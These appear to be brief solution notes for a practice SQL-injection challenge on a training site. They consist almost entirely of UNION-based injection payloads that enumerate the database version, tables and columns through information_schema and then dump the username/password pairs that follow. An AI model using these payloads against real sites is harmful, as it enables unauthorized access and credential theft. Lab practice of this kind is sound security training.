Basic SQL challenge 4

http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=1')%23
')%23

order by 4%23
--4 columns found

union select null,version(),null,null
--5.6.47-cll-lve

union select null,database(),null,null
--leettime_761wHole


union select null,table_name,null,null from information_schema.tables where table_schema=database()
--testtable1
--userlogs
--users

union select null,column_name,null,null from information_schema.columns where table_schema=database() and table_name =('users')
-- id
-- username
-- password
-- user_type
-- sec_code

union select null,concat(username,0x09,password,0x0a),null,null from users

 injector	khan
 decompiler	hacktract
 devilhunte	dante
 Zen	sec-idiots
 Zenodermus	security-i
 grayhat	hacker
 khan	haxor
 admin	sadmin
